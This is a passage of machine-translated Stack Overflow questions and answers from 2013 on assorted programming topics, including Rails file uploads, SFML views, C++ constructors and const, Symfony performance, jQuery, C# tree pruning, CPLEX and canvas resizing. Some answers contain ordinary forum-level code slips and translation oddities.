现在，当您实现*任何*模式时，您通常有足够的信息来查看是否需要数据字段。然而，随着软件的增长，您几乎无法排除将来需要在其他模式中包含相同的类。从这个角度来看，接口优于抽象类的普遍偏好为您提供了更长期的灵活性——只要您有选择。

根据装饰者的性质，您可以选择。组件通常没有预定义的嵌套顺序。如果他们这样做了，您将直接使用继承，而不是组件。所以你应该更喜欢接口来组成一个装饰器。

尽管如此，你原来的论点也是有效的。装饰器组件（特征）可以理解为 is-a 关系，如果你喜欢的话；但这不是看待它们的最自然的方式。

# ruby-on-rails - 在父级的新视图/表单中创建关联记录。关联记录通过ajax/jquery-file-upload完成

> ID：16091614
> 
> 赞同：0
> 
> 时间：2013-04-18T19:36:19.260
> 
> 标签：ruby-on-rails, ajax, activerecord, associations, jquery-file-upload

所以我有一个“风格”模型，它有很多“图像”。在新样式页面中，我希望能够在同一页面中添加所有图像。但是，由于我们还没有创建样式记录，所以它没有 ID。那么我将如何收集所有由 ajax 构建/上传的图像，并在保存新样式后更新它们的 style_id 属性？

我正在使用 jquery-file-upload 将图像添加到 Image 表，并将我的文件上传到 Rackspace 云文件。所有这些都有效，除了手动设置之外，我无法设置 style_id。

是否有最佳实践/正确的方法来解决这个问题，因为 jquery-file-upload 使用 Ajax，我不确定保存我父母的最佳方法。我认为最好的方法是使用 ajax 来提交父表单，而不是使用 dom，比如向父表单添加隐藏的输入/元素？

谢谢你

风格：形式偏

```
<%= form_for @style, :html => {:multipart => true} do |f| %>
    //NORMAL RAILS FORM CODE HERE
<% end %>

<%= form_for Image.new, :html => { :multipart => true, :id => "fileupload"  } do |f| %>
  <%= f.file_field :file, :multiple => true %>
<% end %>

<script>
$(function () {
  $('#fileupload').fileupload({
    dataType: 'json',
    url: '<%= style_images_path(1) %>',
    add: function (e, data) {
        data.context = $('<div class="img uploading"/>').text('Uploading...').appendTo(document.body);
        data.submit();
    },
    done: function (e, data) {
        $.each(data.result.files, function (index, file) {
            $('<img src="'+file.thumbnail_url+'">').appendTo(data.context);
        });
        console.log(data);
        data.context.append("<span>done</span>");
    },
    option: {
            autoUpload: true,
    }
  });
});
</script> 
```

在上面的代码中你可以看到我手动设置了 style_id... style_images_path(1)

-

**我提出的解决方案：**

我的想法是将所有子项（图像）的 id 数组传递给样式的创建/更新方法。并在控制器中，将匹配 id 的所有 style_id 属性更新为新创建的样式的 id ...我认为这可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T21:53:45.697

这很棘手。

`new`您可以在控制器的方法中实例化 @style 。而不是：

```
@style = Style.new 
```

放

```
@style = Style.create 
```

如果验证出现问题，请使用以下解决方法：

```
@style = Style.new
@style.save :validate => false 
```

现在在您看来，您有一个完全合格的@style，其 ID 可以传递给 js：

```
 url: '<%= style_images_path(@style) %>', 
```

此时（如果有的话）用户单击表单按钮时，控件到达`update`方法，而不是`create`（这是因为`_form.html.erb`自动将 HTTP 动词从 POST（创建）更改为 PUT（更新）。所以请确保您的控制器准备好了）。

您还应该考虑某种“垃圾收集”，以防 Style 对象被创建并且从未保存。这可能不是直截了当的，因为用户总是可以关闭窗口，而您在数据库中留下的样式不完整。也许一些在窗口关闭时触发并调用`garbage_collect_if_not_saved(@style)`方法的js函数？仍然不完美（如果浏览器挂起怎么办？）但总比没有好。否则，一个旧的基于 cron 的脚本可以清理数据库。

干杯，

# c++ - C++ SFML 在定义的矩形内绘制可滚动内容

> ID：16091616
> 
> 赞同：2
> 
> 时间：2013-04-18T19:36:27.360
> 
> 标签：c++, viewport, sfml, vertical-scrolling

我无法在定义的矩形内绘制可滚动内容。我想要实现的是能够在矩形内自由滚动内容，任何不在或部分不被裁剪的内容。目前，我滚动可用项目的数量，以确保在矩形之外绘制任何内容。

查看 SFML 中可用的内容，似乎我应该能够使用 sf::View 来实现这一点，但我的尝试没有奏效。

```
sf::View panelView;

panelView.reset(sf::FloatRect(220,85,815,575));
panelView.setViewport(sf::FloatRect(0, 0, 1.0f, 1.0f)); 
```

然后我将视点设置为此，绘制我的项目，然后返回默认视图。它似乎总是绘制到整个屏幕而不是我在重置方法中设置的所需矩形？

我的理解是，这应该在 x 轴上的 220、y 轴上的 85、815 宽和 575 高处创建视口，但它在此边界之外绘制。

有任何想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-18T23:00:15.820

对问题进行了更深入的研究 - 似乎我只需要将我的位置设置为 0.0f 和 1.0f 之间的一个因子，下面的示例代码中的位置是我希望放置视口的位置：

```
sf::FloatRect panelRect(position.left / SCREENWIDTH,
(position.top) / SCREENHEIGHT,
(position.width) / SCREENWIDTH,
(position.height) / SCREENHEIGHT);

panelView.reset(sf::FloatRect(position.left,position.top,position.width,position.height));
panelView.setViewport(panelRect); 
```

# ruby - Ruby/Shell：“puts”/“cat”一个不起眼的文件会弄乱终端

> ID：16091622
> 
> 赞同：0
> 
> 时间：2013-04-18T19:36:55.287
> 
> 标签：ruby, shell, undefined-behavior

我尝试在 Ruby 中为 Windows 重写一些 bash 命令，并尝试将某些系统文件完全弄乱终端：它随机向上滚动（Windows）或向下滚动（Linux）

有问题的文件是这个：

[http://danyel.apus.uberspace.de/somefile](http://danyel.apus.uberspace.de/somefile)

我的 Ruby 程序是这样的：

```
#!/package/host/localhost/ruby-2.0.0/bin/ruby
#cat.rb
File.open(ARGV[-1], "r") do |f|
    puts f.read
    f.close
end 
```

如果我“cat”文件（通过 bash），那么行为也完全是随机的。

这是有原因的吗？

感谢帮助，

问候，
丹尼尔。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T20:09:46.730

该文件看起来像一个数据库......如果你在控制台上检查它，你会看到十六进制文字。您可以像这样使其“可读”：

```
puts File.read('path/to/file').unpack('H*') 
```

# c++ - 在构造函数中使用参数实例化类时出现错误 LNK2001

> ID：16091627
> 
> 赞同：0
> 
> 时间：2013-04-18T19:37:23.523
> 
> 标签：c++

下午好，

## 问题 #1

我有一个神秘的问题，我可以毫无问题地调用我定义的类，但是如果我尝试向构造函数添加一个参数，并用一个参数实例化该类，它会给出两个`LNK2001`错误，一个是构造函数，一个是一个用于析构函数。

```
error LNK2001: unresolved external symbol "public: __thiscall socket_h::~socket_h(void)" (??1socket_h@@$$FQAE@XZ)
error LNK2001: unresolved external symbol "public: __thiscall socket_h::socket_h(char const *)" (??0socket_h@@$$FQAE@PBD@Z) 
```

代码如下：

类头：

```
class socket_h{
protected:
    ;//...

public:

    socket_h(const char*);
    int receive_data(char* szBuffer);
    int send_data(char* szMessage);
    ~socket_h(void);
}; 
```

课程来源：

```
class socket_h{
protected: 

       ;//...

public:

socket_h()
{
    socket_h("192.168.5.100");
}

socket_h(const char* ip_address)
{
    ;//...;
}
//...
~socket_h(void)
{
    closesocket(sClient);

    WSACleanup();
}
}; 
```

调用函数：

```
private: System::Void read_socket_Click(System::Object^  sender, System::EventArgs^  e) {
         socket_h accelerometer("192.168.5.100");

} 
```

## 问题 #2

我有一个跟进错误。

我仍在为上述问题寻求帮助，但为了节省时间，我在类中添加了一个额外的方法并将调用函数更改为：

```
private: System::Void read_socket_Click(System::Object^  sender, System::EventArgs^  e) {

         socket_h accelerometer();
         accelerometer->setAddress("192.168.5.100", 80);
} 
```

但是，我现在收到错误：

```
error C2227: left of '->setAddress' must point to class/struct/union/generic type   1664    1 
```

我似乎做的一切都是正确的，我不明白为什么会发生这种情况。谢谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T19:40:54.577

你有一大堆错误和误解。从[Hello World 程序](https://en.wikipedia.org/wiki/Hello_world_program)开始并阅读一些 C++ 教程会对您有好处。现在来解决问题。

## 问题 #1

您忘记在头文件中声明无参数构造函数：

```
class socket_h {
  ...
  socket_h();
  ...
}; 
```

您的源文件看起来也很可疑。您不应该再`class socket_h { ... };`在源文件中使用。**[而是使用范围解析运算符](http://en.wikipedia.org/wiki/Scope_resolution_operator)**定义方法和构造函数：

```
socket_h::socket_h()
{

}

socket_h::socket_h(const char* ip_address)
{

}

socket_h::~socket_h(void)
{
    closesocket(sClient);

    WSACleanup();
} 
```

此外，构造函数链调用存在语义错误：

```
socket_h::socket_h()
{
    socket_h("192.168.5.100"); // <--- this is illegal
} 
```

在 C++11 中，您可以使用**[委托构造函数](http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2006/n1986.pdf)**，如下所示：

```
socket_h::socket_h(): socket_h("192.168.5.100")
{

} 
```

然而，这个特性[似乎还没有](http://blogs.msdn.com/b/vcblog/archive/2011/09/12/10209291.aspx)在 VC++ 11 中实现。

## 问题 #2

改成：

```
socket_h accelerometer; 
```

即删除`()`。`accelerometer`否则，编译器会将其与具有 name和 return type的无参数函数声明混淆`socket_h`。这种模棱两可的问题被称为**[最令人头疼的问题](http://en.wikipedia.org/wiki/Most_vexing_parse)**。

改成：

```
accelerometer.setAddress("192.168.5.100", 80); 
```

解释很简单：`accelerometer`不是指针，因此您不应该使用`->`它来访问它的成员和方法。`accelerometer`是 的一个实例`socket_h`，因此要访问其成员和方法，您应该使用`.`运算符。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:57:01.750

socket_h 加速度计（“192.168.5.100”）；// 您没有将字符串作为参数的构造函数。

# php - 为什么 Symfony 2 在我的环境中响应非常缓慢？

> ID：16091628
> 
> 赞同：7
> 
> 时间：2013-04-18T19:37:25.553
> 
> 标签：php, apache, symfony, vmware, symfony-2.2

我有一个运行 Debian Squeeze 的 VMware 虚拟机。我所有的项目都在我的 Windows 机器上的一个文件夹中，Debian VM 可以通过 VMware 共享文件夹访问。这意味着我可以在我的 Windows 机器上使用适当的文本编辑器来处理我的项目，同时从 linux 环境中托管它们。在我试用[Symfony](http://symfony.com/)之前，我已经使用这个设置几个月了，使用 PHP 或其他与开发相关的任务托管 Apache 站点没有问题。

我现在在我的 htdocs 目录中有一个 Symfony 2 的开箱即用演示 ( **Symfony_Standard_Vendors_2.2.1.tgz** ) 的实例，以及在我的 Windows 机器上与 VM 共享的一个实例。我的 htdocs 目录如下所示：

```
htdocs
|`- Symfony
 `- Symfony_shared -> /mnt/hgfs/Dropbox/Symfony 
```

**Symfony**是位于 htdocs 文件夹中的实际物理目录，而**Symfony_shared**是指向我 Windows 机器上 Dropbox 文件夹的软链接。我必须重复；我以前从未遇到过这种方法的任何性能问题。

### 相同的文件系统

现在 - 当我在浏览器中访问[http://devmachine.local/Symfony/web/app_dev.php](http://devmachine.local/Symfony/web/app_dev.php)并继续分析器时，我看到了这些数字：

```
总时间 83 毫秒
初始化时间 43 ms
```

非常漂亮的数字。整个响应在不到 100 毫秒内准备就绪。

### 链接

但是当我访问[http://devmachine.local/Symfony_shared/app_dev.php](http://devmachine.local/Symfony_shared/app_dev.php)我在分析器中看到非常不同的数字：

```
总时间 6833 毫秒
初始化时间 4249 ms
```

谁能解释这些数字？什么是“初始化时间”，为什么超过 4 秒？请记住，这只是 Symfony 演示欢迎页面。我的实际测试项目中的登录页面初始化时间为*19 秒*，总时间为 22 秒。

我应该提一下，我还在`php app/console`两个目录中进行了快速测试。在 Symfony 文件夹中，此命令立即返回使用情况，而在 Symfony_shared 中，它需要几秒钟才能响应。

我对 Symfony 文件夹所做的唯一更改是删除了 app_dev.php 中将流量限制为 127.0.0.1 的部分。

* * *

我在 Debian 6.0.7（挤压）上使用 Apache 2.4.4 和 PHP 5.4.14。

这是 Symfony_shared 欢迎页面分析器的屏幕截图：

![Symfony_shared 欢迎页面分析器的屏幕截图](https://i.stack.imgur.com/xJayg.png)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-19T01:09:11.917

检查您的 PHP 配置是否存在`open_basedir`阻止统计缓存工作的限制。Symfony 会进行大量`fstat()`调用，如果这些调用没有被缓存，Symfony 会非常慢。您的符号链接也可能阻止统计缓存工作。如果您分析您的应用程序（并包含本机 PHP 函数），那么很明显它是否会`fstat()`导致您的问题。

[PHP Bug #49383](https://bugs.php.net/bug.php?id=49383)有一些关于它的信息。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-12-18T12:59:59.610

尝试将 PHP.ini 的 realpath_cache_size 设置为 > 1000 最近添加了一个 symfony 要求来解决此问题：[https ://github.com/sensiolabs/SensioDistributionBundle/commit/cf0179711b24d84d4a29d71a4010540f4c990bd8](https://github.com/sensiolabs/SensioDistributionBundle/commit/cf0179711b24d84d4a29d71a4010540f4c990bd8)

# javascript - 显示模糊数据

> ID：16091633
> 
> 赞同：-1
> 
> 时间：2013-04-18T19:37:48.577
> 
> 标签：javascript, blur

我有一个简单的表（从数组动态生成），我可以在其中放置件数，以便价格可以在价格字段中自动计算（模糊）。这两个字段都是表单输入字段。
因此，源代码如下所示：

```
<?php 
foreach($ItemArray['1'] as $key => $value) { 
echo '
<tr>
    <td height="30" valign="middle">'.$value['nr'].'</td>
    <td valign="middle">'.$value['product'].'</td>
    <td valign="middle">'.$value['describe'].'</td>

    <td valign="middle" id="stockprice_'.$key.'">
    <input name="Field_Price_'.$key.'" id="Field_Price_'.$key.'" value="'.$value['price'].'" type="text" /></td>

    <td valign="middle" class="box_darker" id="amount_'.$key.'">
    <input name="Field_Amount_'.$key.'" id="Field_Amount_'.$key.'" type="text" /></td>

    <td valign="middle" id="price_'.$key.'">
    <input name="Field_Total_'.$key.'" id="Field_Total_'.$key.'" type="text" />
    </td>
</tr>'; }
;?> 
```

我意识到的方式是当用户输入任何金额（在“Field_Amount_”中）并从中退出（onblur），所以金额字段应该取值（来自“Field_Amount_”）然后必须输入总价（在“Field_Total_”中）。所以我尝试了这个解决方案，但它不起作用。

```
$(document).on('blur', '[id^=Field_Amount_]', function(){

    Amount = $(this).parent().find('[id^=Field_Amount_]').val();
    StockPrice = $(this).parent().find('[id^=Field_Price_]').val();
    Price = $(this).parent().find('[id^=Field_Total_]');
    RowPrice = Amount * StockPrice;

    if(Amount) { $(Price).text(accounting.formatNumber(RowPrice, 2, ".", ","));}
}); 
```

谁能给我一个建议，我必须如何做到这一点？非常感谢。

非常感谢你帮助我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:45:37.873

我有一种感觉，代码：

`$(this).parent().find('input[id^=Field_Amount_]').val();`

实际上指向`<td>`标签本身。

```
The `$(this)` is actually pointing to the input field of the amount.

var amount = $(this).val();

                 //field - td - tr
var stockPrice = $(this).parent().parent().find('input[id^=Field_Price_]').val(); 
```

等等……

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-18T19:43:55.753

将您的选择器从更改`[id^=Field_Amount_]`为`input[id^=Field_Amount_]`

# c# - 修剪结束节点满足某些条件的树枝

> ID：16091635
> 
> 赞同：5
> 
> 时间：2013-04-18T19:37:52.793
> 
> 标签：c#, linq

我有一`TreeNode`堂课如下：

```
public class TreeNode
{
    public enum NodeType { Root,Element, Category}
    public TreeNode()
    {
        Children = new List<TreeNode>();
    }
    public List<TreeNode> Children { get; set; }
    public string Name { get; set; }
    public NodeType Type { get; set; }
} 
```

我有一个`BuildTree`填充树结构的方法，为每个节点设置节点名称和类型（例如，第一个节点将设置为根类型，子节点可以是元素或类别类型）。

我正在寻找一种有效的方法（可能使用 LINQ）来修剪结束节点类型不是 Category 类型的树枝。关于如何实现这一目标的任何想法？

这是一个视觉示例：

**之前**：

```
Root
|
|_ NodeA (Element)
|_ Node B (Element)
|  |_ Node B.1 (Category)
|_ Node C (Element)
|  |_ Node C.1 (Element)
|    |_Node C.1.1 (Category)
|_ Node D (Element)
   |_Node D.1 (Element) 
```

**之后**：

```
Root
|
|_ Node B (Element)
|  |_ Node B.1 (Category)
|_ Node C (Element)
   |_ Node C.1 (Element)
     |_Node C.1.1 (Category) 
```

提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T19:49:33.527

首先，我们需要描述如何对树进行深度优先聚合：

```
//seed: leafNode -> accumulate
//func: interiorNode, children accumulates -> accumulate
public static TAccumulate Aggregate<TAccumulate>(
    this TreeNode root,
    Func<TreeNode, TAccumulate> seed,
    Func<TreeNode, List<TAccumulate>, TAccumulate> func)
{
    if (root.Children == null || !root.Children.Any())
        return seed(root);
    return func(root, children.Select(child => child.Aggregate(seed, func)).ToList());
} 
```

然后我们可以使用它来进行修改，例如您要求的修改：

```
tree.Aggregate(
    leaf => new
    {
        Keep = leaf.NodeType == TreeNode.NodeType.Category,
        Node = leaf
    },
    (node, children) =>
    {
        var removal = new HashSet<TreeNode>(
            children.Where(child => !child.Keep).Select(child => child.Node));
        node.Children.RemoveAll(removal.Contains);
        return new
        {
           Keep = children.Any(child => child.Keep),
           Node = node
        };
    }); 
```

这为您提供了一种简洁、声明性的方式来描述您想要应用于树的变换，而无需在变换描述中深入了解遍历的细节。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-18T19:43:55.617

没那么复杂。你只需要递归遍历树。基本情况是节点本身是一个类别。然后只需在每个孩子上调用该函数，并在他们的孩子中保留那些有类别的人。

```
/// <summary>
/// Removes all child nodes that do not have at least one Category as a child.
/// </summary>
/// <param name="node">The node to alter the children of.</param>
/// <returns>True if there is at least one Category in this subtree</returns>
public static bool RemoveEmptyElements(TreeNode node)
{
    if (node.Type == TreeNode.NodeType.Category)
        return true;
    node.Children = node.Children.Where(child => RemoveEmptyElements(child))
            .ToList();
    return node.Children.Any();
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T19:49:04.633

您可以只使用后序遍历一棵树。当您返回树的第 2 级而没有找到类别类型叶时。再次从该节点遍历以删除所有以该节点为根的叶子。

# sbt - 从子项目中的 Mainprojekt 导入类

> ID：16091639
> 
> 赞同：2
> 
> 时间：2013-04-18T19:38:13.080
> 
> 标签：sbt, playframework-2.1

我有一个具有以下结构的播放应用程序：

```
-mainApp
 -app
   - controllers
   - models
   - services
   - views
 -test
 -modules
... 
```

我在模块文件夹中有一个子项目。现在我想在一个子模块的类（称为“listadmin”）的“服务”文件夹中使用类 Test.class。我认为导入是可能的：

```
import services.Test; 
```

但这不起作用。我收到系统不知道包服务的错误（如果我编译）。如何在子项目中导入主项目的类？

感谢帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-28T15:07:04.853

我认为你能做到这一点的唯一方法是让子项目依赖于主项目。当然，主项目也会依赖于子项目，所以我不确定你通过创建子项目可以获得什么。我有一个类似的问题。我正在尝试将我的大项目分成独立的小项目，但我需要来自大项目的一些信息（主模板文件，以便我的视图适合应用程序的其余部分，一个默认 URL 将页面发送到何时用户无权查看页面等。）如果我找不到有人已经问过这个问题，我会去的，所以请留意。

# extjs - 更新的记录与 Store.sync() 不匹配

> ID：16091642
> 
> 赞同：0
> 
> 时间：2013-04-18T19:38:22.603
> 
> 标签：extjs, sencha-touch

更新商店时遇到问题

```
Ext.define("ManageShows.model.Show", {
extend: "Ext.data.Model",
config: {
    idProperty: 'id',
    fields: [
        { name: 'id' , type: 'int'},
        { name: 'name', type: 'string' }
    ],
    validations: [
        { type: 'presence', field: 'name', message: 'Please enter a name for this show.'}
    ]
}
}); 
```

当我尝试同步（）我得到这个错误

```
[WARN][Ext.data.Operation#process] Unable to match the updated record that came back from the server. 
```

然后保存数据的列表包含列表中第一个元素的重复条目。但是，如果我刷新页面，我的列表将正确显示更新后的术语。

我不知道记录的哪一部分不匹配。我能看到的唯一不同是 Store.id = "ext-record-4" 似乎是自动生成的，我没有将此值保存在我的数据库中，而是 Store.data.id = {id from database}。

我怎样才能找到不匹配的内容？

编辑：重要说明是我连续 7 次收到错误，并且我有 8 个条目。如果我更新了第一个条目，那么更改将起作用并正确显示

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T20:48:21.290

在 sync() 调用后，我停止了我的 servlet 返回 json 数据。这不是必需的，因为 sencha touch 会自动在本地更新数据

# python - 安装 OpenMDAO

> ID：16091644
> 
> 赞同：0
> 
> 时间：2013-04-18T19:38:28.230
> 
> 标签：python, terminal, installation, versions, openmdao

我正在尝试安装 OpenMDAO，这是一个使用 python 的开源框架。所以在我开始之前，它需要 3 个包：

1.  Fortran 编译器
2.  数字货币
3.  ScyPy

我使用自制软件安装的：

```
brew install gfortran
sudo easy_install-2.6 pip
sudo pip-2.6 install numpy
sudo pip-2.6 install scipy 
```

现在，要安装 OpenMDAO，我应该在 OpenMDAO 文件夹中，在那个级别我应该运行这个脚本：

```
python go-openmdao-dev.py 
```

但我不断收到此错误：

```
ERROR: the following prerequisites could not be imported: ['scipy']. 
```

所以我在与 OpenMDAO 的人交谈，似乎我需要使用的是 python2.6 - 虽然我不确定，所以我的猜测是我安装的所有包都是我下载的 python 2.7，因为它是在python网站上推荐。

Mac 自带的不是。因此，当我在终端中输入以下内容时：

```
python2.6 
```

它实际上运行该版本。所以此时我不知道是否必须在 python 2.6 中运行脚本，但如果是这样，我不知道该怎么做。我试过这样做，但没有奏效：

![问题截图](https://i.stack.imgur.com/MYZsD.png)

如果有人熟悉环境或只是对 python 本身有任何建议，我将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T03:03:14.747

这个问题在 OpenMDAO 支持论坛上得到了回答：http: [//openmdao.org/forum/questions/744/error-the-following-prerequisites-could-not-be-imported-scipy](http://openmdao.org/forum/questions/744/error-the-following-prerequisites-could-not-be-imported-scipy)

解决方案是为 python2.7 安装 scipy 和 numpy。原始海报首先为 python2.6 安装了它们，但随后使用 python2.7 运行了 go-openmdao.py 脚本。一旦为 2.7 安装了所有 pre-reqs，它就可以工作了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T14:53:28.460

从 .dmg 下载 scipy 后，我遇到了同样的问题。我卸载了，然后从源重新安装：http: [//sourceforge.net/projects/scipy/files/scipy/0.12.0/](http://sourceforge.net/projects/scipy/files/scipy/0.12.0/)然后openmdao安装程序识别了scipy。

这可能很有用（来自 scipy-0.12.0.tar.gz 中的 INSTALL.txt）：

> 要在安装后测试 SciPy（强烈推荐），请在 Python 中执行
> 
> >>> 导入 scipy
> >>> scipy.test()
> 
> 要运行完整的测试套件，请使用
> 
> >>> scipy.test('full')
> 
> 请注意，您必须安装 0.10 或更高版本的“鼻子”测试框架才能运行测试。有关鼻子的更多信息，请访问网站__。
> 
> __ [http://somethingaboutorange.com/mrl/projects/nose/](http://somethingaboutorange.com/mrl/projects/nose/)

# html - Magento 管理员使用表单字段创建 HTML 并将其保存到数据库

> ID：16091646
> 
> 赞同：1
> 
> 时间：2013-04-18T19:38:30.810
> 
> 标签：html, magento

我正在开发一个模块，该模块需要输入一些 html 以便稍后调用并成为面向客户的小部件输出的一部分。

我创建了一个管理后端，一切正常，但是当我在应该存储数据的字段中输入 html 时，我收到一个错误。我不需要所见即所得，但我希望能够将 html 输入到这个值中。

在这一点上，在将字段添加到字段集中时，我没有做任何特别的事情。我错过了什么？

```
 $contentField = $fieldset->addField('inner_html', 'editor', array(
        'name'      => 'inner_html',
        'style'     => 'height:36em;width:36em',
        'required'  => false,
    )); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:44:18.187

尝试

```
$fieldset->addField('inner_html', 'editor', array( 
    'name' => 'inner_html', 
    'label' => Mage::helper('tag')->__('Description'), 
    'title' => Mage::helper('tag')->__('Description'), 
    'style' => 'width:700px; height:350px;', 
    'config' => Mage::getSingleton('cms/wysiwyg_config')->getConfig(array('add_variables' => false, 'add_widgets' => false,'files_browser_window_url'=>$this->getBaseUrl().'admin/cms_wysiwyg_images/index/')), 
    'wysiwyg' => true, 
    'required' => false, 
)); 
```

# c++ - 如何从 Cplex 获取约束数量

> ID：16091648
> 
> 赞同：3
> 
> 时间：2013-04-18T19:38:50.440
> 
> 标签：c++, modeling, linear-programming, cplex

我有一个用 C++ 编写的很长的程序，我正在用`ILOG Cplex12.5 Solver`它来解决它。如何获得约束的总数？有它的功能吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T13:11:10.460

`IloModel`一旦你在一个`IloCplex`对象中提取了模型`IloCplex::getNrows`（

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-18T22:32:39.757

有一个类 IloModel::Iterator 类可让您访问 IloModel 对象中的 IloExtractable 对象。IloExtractable 有一个 asConstraint 方法，如果可提取对象不是约束，该方法将返回一个空句柄。任何 ILOG 音乐会句柄的 getImpl() 方法都将返回 0。因此，您可以遍历所有可提取对象并计算 asConstraint 函数不返回空句柄的对象。

```
#include <ilconcert/ilomodel.h>

unsigned getNumConstraints(IloModel m)
{
  unsigned count = 0;
  IloModel::Iterator iter(m);
  while (iter.ok()) {
    if ((*iter).asConstraint().getImpl()) {
      ++count;
    }
    ++iter;
  }
  return count;
} 
```

# javascript - 来自表单值的画布宽度和高度

> ID：16091649
> 
> 赞同：1
> 
> 时间：2013-04-18T19:38:56.177
> 
> 标签：javascript, html, canvas

我有这个代码，画布的高度和宽度第一次从 nCol 和 nLin 值中获取值，但是当 nCol 和 nLin 值的值发生变化时不会更新。您应该在哪里找到更改的代码是动态的？在 if (canvas.getContext) {} 或函数 MakeCnv 中？

```
<html>
<body>
<canvas id="canvas">
    <span style="color: red">
    <b>canvas</b> not supported</span>
</canvas>
<br />
Col: <input type="text" value="3" id="nCol" />
Lin: <input type="text" value="3" id="nLin" />
Text: <input type="text" value="Text" id="texto" />
<input type="button" value="Make Canvas"
onclick="MakeCnv()" />

<script>
var canvas = document.getElementById("canvas");
var line = document.getElementById("nLin").value;
var cols = document.getElementById("nCol").value;
var cnv = null;

// resize the canvas
canvas.width = line * 32;
canvas.height = cols * 32;
canvas.style="border: blue solid 1px";

if (canvas.getContext) {
    cnv = canvas.getContext("2d");
    MakeCnv();
}
function MakeCnv(){
        cnv.strokeStyle = "olive";
        // put the text in the canvas
}
</script>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:57:19.503

更改您的`<script>`块以添加处理画布大小的新函数：

```
<script>
function resizeCanvas(){
    var canvas = document.getElementById("canvas");
    var line = document.getElementById("nLin").value;
    var cols = document.getElementById("nCol").value;

    // resize the canvas
    canvas.width = line * 32;
    canvas.height = cols * 32;
}

var canvas = document.getElementById("canvas");
canvas.style="border: blue solid 1px";
resizeCanvas();

var cnv = null;
if (canvas.getContext) {
    cnv = canvas.getContext("2d");
    MakeCnv();
}

function MakeCnv(){
    cnv.strokeStyle = "olive";
    // put the text in the canvas
}
</script> 
```

更改您的`<input>`文本框以附加`onchange`事件侦听器。

```
Col: <input type="text" value="3" id="nCol" onchange="resizeCanvas()"/>
Lin: <input type="text" value="3" id="nLin" onchange="resizeCanvas()"/> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T20:02:21.773

而不是
`canvas.style="border: blue solid 1px";`
你可能想要
`canvas.style.border = "blue solid 1px";`

您的代码可以更改为：

```
<!DOCTYPE html>
<html><head>
<script type='text/javascript'>//<![CDATA[ 
function dimensionCanvas(){
    var canvas = document.getElementById("canvas");
    var line   = document.getElementById("nLin").value;
    var cols   = document.getElementById("nCol").value;
    window.cnv = null;  
    // resize the canvas also clears the canvas as per spec!!!
    canvas.width = line * 32; 
    canvas.height = cols * 32; 
    canvas.style.border = "blue solid 1px"; 
    if (canvas.getContext) { 
      window.cnv = canvas.getContext("2d");
      MakeCnv();
    }
}

function MakeCnv(){
        cnv.strokeStyle = "olive";
        // put the text in the canvas
}

window.onload=function(){
    dimensionCanvas();
};
//]]>  
</script>
</head><body>
<canvas id="canvas">
    <span style="color: red">
    <b>canvas</b> not supported</span>
</canvas>
<br />
Col: <input type="text" value="3" id="nCol" onchange="dimensionCanvas()" />
Lin: <input type="text" value="3" id="nLin" onchange="dimensionCanvas()" />
Text: <input type="text" value="Text" id="texto" />
<input type="button" value="Make Canvas" onclick="MakeCnv()" />
</body></html> 
```

在这里工作[小提琴](http://jsfiddle.net/FKV94/)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T19:45:46.723

使用`onchange`属性。将其添加到您的输入中：

```
<input onchange="run()"> 
```

或者在你的 JS 中使用它：

```
document.getElementById("nLin").onchange = run(); 
```

两者都需要`run`定义函数 - 所有这些都必须包含变量设置：

```
var line,
    cols;

function run() {
    line = document.getElementById("nLin").value;
    cols = document.getElementById("nCol").value;
} 
```

# c++ - const 关键字和重复的方法签名

> ID：16091651
> 
> 赞同：3
> 
> 时间：2013-04-18T19:39:16.197
> 
> 标签：c++

我刚开始学习 C++，从 JAVA 环境切换。

在阅读一些 Boost 示例时，我发现在一个类中定义了以下两种方法：

```
const char* data() const
{
    return data_;
}

char* data()
{
  return data_;
} 
```

有两件事让我感到困惑。

首先是保留字`const`，我想我在这里理解。第一个`const`指的是，`char*`这意味着我不能改变指针的值。第二个`const`告诉我调用函数不会改变我正在调用的对象的状态。这是正确的解释吗？

混淆的第二点是为什么会有两个具有相同名称和签名的方法。编译器如何知道我要调用哪一个？我如何知道是否允许我在调用后更改数据`data()`而不知道我调用了两个中的哪一个？

 `* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-18T19:43:07.427

第一个函数返回一个指向常量数据的指针。`const`函数签名末尾的 表示该函数不会修改和类数据成员 。

第二个函数返回一个指向可变数据的指针。调用者可以使用指针来修改类成员变量。

在网上搜索“常量正确性”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-18T19:43:28.073

有几种方法可以使用指针在变量中声明 const：

```
const char *  // you can modify the pointer, not the item pointed to
char const *  // you can modify the pointer, not the item pointed to

char * const  // you can modify the item pointed to, not the pointer

const char const *  // you cannot modify either
char const * const  // you cannot modify either
const char * const  // you cannot modify either 
```

